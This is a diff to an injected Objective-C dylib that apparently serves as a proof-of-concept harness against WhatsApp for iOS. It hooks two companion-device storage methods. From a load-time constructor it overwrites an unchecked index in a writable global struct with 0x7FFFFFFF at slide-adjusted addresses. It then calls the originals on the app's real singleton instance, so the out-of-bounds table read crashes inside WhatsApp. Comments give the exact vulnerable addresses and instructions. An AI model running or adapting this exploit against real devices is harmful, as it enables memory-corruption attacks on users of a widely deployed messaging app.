@@ -1,19 +1,20 @@
 // ME73b (t8) test dylib — 2 NEW companion-device family sites:
-//   fetchPendingRemovalCompanionDevicesForAccountUserJID:
-//       @0x1001A4DD4 (unchecked idx @ 0x1001A4E18: ldrsw x8,[x8,#0x10] -> ldr x5,[x21,x8])
-//   fetchLinkedAndPendingRemovalCompanionDevicesForAccountUserJID:currentDeviceList:
-//       @0x101CA1634 (unchecked idx @ 0x101CA1684: ldrsw x8,[x8,#0x10] -> ldr x26,[x20,x8])
+//   fetchPendingRemovalCompanionDevicesForAccountUserJID:        @0x1001A4DD4
+//   fetchLinkedAndPendingRemovalCompanionDevicesForAccountUserJID:currentDeviceList: @0x101CA1634
 // Both read the SAME shared 3-word index struct (thunk 0x1000242A4 -> &0x107d0744c,
 // __DATA __objc_ivar, writable; idx0@+0, idx1@+4, UNCHECKED idx2@+0x10) — same t7 bug class.
-// Drive: write 0x7FFFFFFF into struct+0x10 (slide-adjusted), call orig on crafted
-// instance -> table[0x7FFFFFFF] -> garbage pointer -> downstream SIGSEGV.
 //
-// v2 FIXES:
-//   * struct runtime addr = 0x100000000 + slide + 0x7d0744c  (was missing image base!)
-//   * BOTH selectors swizzled on WAOwnDeviceStorageManagerMain (classmap: same class
-//     hosts all 4 family sites; WAOwnDeviceManagerMain was a wrong guess)
-//   * re-swizzle guard: never re-swizzle an already-hooked selector (prevents
-//     clobbering orig with our own hook on retry attempts)
+// v3 FIXES (v2 crash was a harness artifact, NOT the target bug):
+//   * v2 crafted instance (class_createInstance) dealloc'd with garbage C++ ivars
+//     -> objc_storeStrong crash in destructor. The method itself RETURNED — the
+//     poked 0x7FFFFFFF loaded garbage from a mapped page (2GB into heap) instead
+//     of faulting, then the crafted object's dealloc exploded.
+//   * v3 drives with the REAL singleton: the method itself loads x20 from
+//     *(0x107ceb520+slide) — the app's own storage-manager instance. We read the
+//     same global and message it via objc_msgSend (through our hooks, so orig runs
+//     with real self + real table) -> garbage table entry -> real retain in
+//     WhatsApp's frame -> crash in WhatsApp, not in our harness.
+//   * zeroed-memory fallback instance if the singleton global is not yet set.
 
 #import <Foundation/Foundation.h>
 #import <objc/runtime.h>
@@ -38,29 +39,28 @@ static void wa_marker(NSString *msg) {
     } @catch (NSException *e) {}
 }
 
-// --- shared global index struct: vmaddr 0x107d0744c, image base 0x100000000 ---
+// --- shared global index struct: vmaddr 0x107d0744c; singleton global 0x107ceb520 ---
 static const uint64_t kIndexStructVMA = 0x107d0744cULL;
-static const uint64_t kImgBase       = 0x100000000ULL;
+static const uint64_t kSingletonVMA   = 0x107ceb520ULL;
+static const uint64_t kImgBase        = 0x100000000ULL;
 
-static void *g_struct_slide(void) {
+static void *g_slide_addr(uint64_t vmaddr) {
     uintptr_t slide = _dyld_get_image_vmaddr_slide(0); // main executable
-    return (void *)(kImgBase + slide + (kIndexStructVMA - kImgBase));
+    return (void *)(slide + vmaddr);
 }
 
 // --- hooks ---
 static void (*orig_fetchPending)(id, SEL, id);
 static void hook_fetchPending(id self, SEL _cmd, id jid) {
-    wa_marker([NSString stringWithFormat:@"[hook] fetchPendingRemoval... jid=%@ self=%@", jid, NSStringFromClass([self class])]);
+    wa_marker([NSString stringWithFormat:@"[hook] fetchPendingRemoval... self=%@", NSStringFromClass([self class])]);
     orig_fetchPending(self, _cmd, jid);
 }
 
 static void (*orig_fetchLinked)(id, SEL, id, id);
 static void hook_fetchLinked(id self, SEL _cmd, id jid, id list) {
-    wa_marker([NSString stringWithFormat:@"[hook] fetchLinkedAndPending... jid=%@ list=%@ self=%@", jid, list, NSStringFromClass([self class])]);
+    wa_marker([NSString stringWithFormat:@"[hook] fetchLinkedAndPending... self=%@", NSStringFromClass([self class])]);
     orig_fetchLinked(self, _cmd, jid, list);
 }
-
-static int g_hooked = 0;
 
 static void wa_swizzle(Class cls, SEL sel, IMP newImp, void **origOut) {
     if (*origOut) return; // already hooked — do NOT clobber
@@ -86,10 +86,22 @@ static Class wa_find_class(SEL sel) {
     return hit;
 }
 
+// real instance from the app's own global (the method loads x20 from this exact slot)
+static id wa_real_instance(Class want) {
+    id *slot = (id *)g_slide_addr(kSingletonVMA);
+    if (!slot) return nil;
+    id obj = *slot;
+    if (obj && want && object_isClass(obj) == NO && [obj isKindOfClass:want]) return obj;
+    // try to find any live instance of want among classes' registered instances is
+    // impossible without private runtime — fall back to singleton selector patterns
+    if (obj && [obj respondsToSelector:@selector(isKindOfClass:)]) return obj; // best effort
+    return nil;
+}
+
 static void run_drive_inline(void) {
     wa_marker(@"[drive] t8 drive start (struct idx2 = 0x7FFFFFFF)");
 
-    int32_t *st = (int32_t *)g_struct_slide();
+    int32_t *st = (int32_t *)g_slide_addr(kIndexStructVMA);
     if (!st) { wa_marker(@"[drive] struct NULL — abort"); return; }
     wa_marker([NSString stringWithFormat:@"[drive] struct @%p before: [+0]=%d [+4]=%d [+0x10]=%d", st, st[0], st[1], st[4]]);
     st[4] = 0x7FFFFFFF;  // +0x10 slot
@@ -101,24 +113,38 @@ static void run_drive_inline(void) {
     Class c2 = NSClassFromString(@"WAOwnDeviceStorageManagerMain");
     if (!c1) c1 = wa_find_class(s1);
     if (!c2) c2 = wa_find_class(s2);
-    wa_marker([NSString stringWithFormat:@"[drive] class1=%@ class2=%@", c1 ? NSStringFromClass(c1) : @"?", c2 ? NSStringFromClass(c2) : @"?"]);
 
-    if (orig_fetchPending && c1) {
-        __unsafe_unretained id selfObj = class_createInstance(c1, 0);
-        wa_marker(@"[drive] calling fetchPendingRemoval... (crafted instance)");
-        orig_fetchPending(selfObj, s1, nil);
-        wa_marker(@"[drive] fetchPendingRemoval: RETURNED (no crash)");
-    } else {
-        wa_marker([NSString stringWithFormat:@"[drive] SKIP method1 (orig=%p c1=%p)", orig_fetchPending, c1]);
+    // REAL instance from the app's own global slot
+    id realSelf = wa_real_instance(c1 ?: c2);
+    wa_marker([NSString stringWithFormat:@"[drive] singleton global @%p -> %@ (%@)",
+               g_slide_addr(kSingletonVMA), realSelf ? NSStringFromClass([realSelf class]) : @"nil",
+               realSelf ? @"REAL" : @"missing — will use zeroed fallback"]);
+
+    id self1 = realSelf;
+    id self2 = realSelf;
+    if (!self1 && c1) {
+        self1 = (id)calloc(1, class_getInstanceSize(c1)); // zeroed — no garbage C++ ivars
+        wa_marker(@"[drive] using ZEROED fallback instance for method1");
+    }
+    if (!self2 && c2) {
+        self2 = (id)calloc(1, class_getInstanceSize(c2));
+        wa_marker(@"[drive] using ZEROED fallback instance for method2");
     }
 
-    if (orig_fetchLinked && c2) {
-        __unsafe_unretained id selfObj = class_createInstance(c2, 0);
-        wa_marker(@"[drive] calling fetchLinkedAndPendingRemoval... (crafted instance)");
-        orig_fetchLinked(selfObj, s2, nil, nil);
+    if (orig_fetchPending && c1 && self1) {
+        wa_marker(@"[drive] calling fetchPendingRemoval... via orig");
+        orig_fetchPending(self1, s1, nil);
+        wa_marker(@"[drive] fetchPendingRemoval: RETURNED (no crash)");
+    } else {
+        wa_marker([NSString stringWithFormat:@"[drive] SKIP method1 (orig=%p c1=%p self1=%p)", orig_fetchPending, c1, self1]);
+    }
+
+    if (orig_fetchLinked && c2 && self2) {
+        wa_marker(@"[drive] calling fetchLinkedAndPendingRemoval... via orig");
+        orig_fetchLinked(self2, s2, nil, nil);
         wa_marker(@"[drive] fetchLinkedAndPendingRemoval: RETURNED (no crash)");
     } else {
-        wa_marker([NSString stringWithFormat:@"[drive] SKIP method2 (orig=%p c2=%p)", orig_fetchLinked, c2]);
+        wa_marker([NSString stringWithFormat:@"[drive] SKIP method2 (orig=%p c2=%p self2=%p)", orig_fetchLinked, c2, self2]);
     }
 
     wa_marker(@"[drive] t8 drive complete");
@@ -127,7 +153,7 @@ static void run_drive_inline(void) {
 __attribute__((constructor))
 static void waInit(void) {
     @autoreleasepool {
-        wa_marker(@"=== waContainerFix ME73b v2 (t8 companion-device family) constructor ===");
+        wa_marker(@"=== waContainerFix ME73b v3 (t8 companion-device family) constructor ===");
 
         SEL s1 = NSSelectorFromString(@"fetchPendingRemovalCompanionDevicesForAccountUserJID:");
         SEL s2 = NSSelectorFromString(@"fetchLinkedAndPendingRemovalCompanionDevicesForAccountUserJID:currentDeviceList:");
